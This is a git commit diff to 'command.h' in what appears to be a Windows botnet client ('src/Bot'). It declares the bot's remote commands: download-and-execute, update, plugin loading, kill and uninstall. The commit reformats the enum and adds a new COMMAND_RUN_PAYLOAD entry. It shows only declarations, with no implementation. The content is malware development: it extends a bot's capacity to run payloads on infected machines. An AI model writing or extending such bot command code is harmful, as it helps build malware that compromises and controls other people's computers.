e39fa442677131edae6cdde361a8a5d257076064
TIR-ALMA <visotskayoa@mail.ru>
2026-02-08 21:36:11 +0700

    Update command.h

--- src/Bot/command.h
+++ src/Bot/command.h
@@ -1,19 +1,22 @@
 #ifndef __COMMAND_H__
 #define __COMMAND_H__
 
+#include <windows.h>  // Добавлено для определения VOID, PCHAR
+
 typedef enum
 {
-	COMMAND_DL_EXEC	    = 0x992c01,
-	COMMAND_UPDATE		= 0xba1af8,
-	COMMAND_LOAD_PLUGIN	= 0xbfc330,
-	COMMAND_KILL		= 0x2fe86c,
-	COMMAND_UNINSTALL	= 0xa2327f
+    COMMAND_DL_EXEC     = 0x992c01,
+    COMMAND_UPDATE      = 0xba1af8,
+    COMMAND_LOAD_PLUGIN = 0xbfc330,
+    COMMAND_KILL        = 0x2fe86c,
+    COMMAND_UNINSTALL   = 0xa2327f,
+    COMMAND_RUN_PAYLOAD = 0x123456
 } COMMANDS;
 
 VOID CommandExecute(
-	COMMANDS Command,
-	PCHAR*	 Parameter
+    COMMANDS Command,
+    PCHAR*   Parameter
 );
 
-
 #endif //__COMMAND_H__
+
